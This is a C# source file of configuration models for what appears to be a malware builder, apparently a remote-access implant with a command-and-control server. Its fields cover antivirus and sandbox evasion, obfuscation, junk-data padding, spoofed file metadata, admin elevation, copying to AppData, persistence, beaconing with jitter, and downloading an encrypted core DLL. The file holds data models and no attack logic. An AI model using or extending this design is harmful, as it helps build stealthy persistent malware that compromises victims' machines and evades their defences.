namespace LibraNextgen.Common.Models;

public class BuildConfigRequest
{
    public string Platform { get; set; } = "x64";
    public string ApplicationType { get; set; } = "Console";
    public string ServerHost { get; set; } = "127.0.0.1";
    public int ServerPort { get; set; } = 5270;
    public bool EnableObfuscation { get; set; }
    public bool InjectJunkData { get; set; }
    public int JunkDataMb { get; set; } = 10;
    public string? IconUrl { get; set; }
    public string? CompanyName { get; set; }
    public string? FileDescription { get; set; }
    public string? ProductName { get; set; }
    public string? Copyright { get; set; }
    public string? FileVersion { get; set; }
    public bool StripSymbols { get; set; } = true;
    public bool RequireAdmin { get; set; }
    public bool CopyToAppData { get; set; }
    public bool EnablePersistence { get; set; }
    public AntiAnalysisConfig AntiAnalysis { get; set; } = new();
}

public class AntiAnalysisConfig
{
    [System.Text.Json.Serialization.JsonPropertyName("enabled")]
    public bool enabled { get; set; }

    [System.Text.Json.Serialization.JsonPropertyName("check_test_signing")]
    public bool check_test_signing { get; set; } = true;

    [System.Text.Json.Serialization.JsonPropertyName("check_av_processes")]
    public bool check_av_processes { get; set; } = true;
}

public class InjectedConfig
{
    [System.Text.Json.Serialization.JsonPropertyName("server_url")]
    public string server_url { get; set; } = "";

    [System.Text.Json.Serialization.JsonPropertyName("register_path")]
    public string register_path { get; set; } = "";

    [System.Text.Json.Serialization.JsonPropertyName("heartbeat_path")]
    public string heartbeat_path { get; set; } = "";

    [System.Text.Json.Serialization.JsonPropertyName("result_path")]
    public string result_path { get; set; } = "";

    [System.Text.Json.Serialization.JsonPropertyName("ws_path")]
    public string ws_path { get; set; } = "";

    [System.Text.Json.Serialization.JsonPropertyName("heartbeat_interval_ms")]
    public ulong heartbeat_interval_ms { get; set; } = 3000;

    [System.Text.Json.Serialization.JsonPropertyName("jitter_percent")]
    public double jitter_percent { get; set; } = 0.2;

    [System.Text.Json.Serialization.JsonPropertyName("require_admin")]
    public bool require_admin { get; set; }

    [System.Text.Json.Serialization.JsonPropertyName("copy_to_path")]
    public string? copy_to_path { get; set; }

    [System.Text.Json.Serialization.JsonPropertyName("enable_persistence")]
    public bool enable_persistence { get; set; }

    /// Base64-encoded RSA-OAEP encrypted AES-256 key (for core DLL decryption)
    [System.Text.Json.Serialization.JsonPropertyName("encrypted_aes_key")]
    public string encrypted_aes_key { get; set; } = "";

    /// Server path to download the encrypted core DLL
    [System.Text.Json.Serialization.JsonPropertyName("core_download_path")]
    public string core_download_path { get; set; } = "";

    /// Base64-encoded PKCS#8 DER RSA private key (for decrypting the AES key)
    [System.Text.Json.Serialization.JsonPropertyName("rsa_private_key")]
    public string rsa_private_key { get; set; } = "";

    /// Anti-analysis configuration (sandbox/VM/debug detection)
    [System.Text.Json.Serialization.JsonPropertyName("anti_analysis")]
    public AntiAnalysisConfig? anti_analysis { get; set; }
}
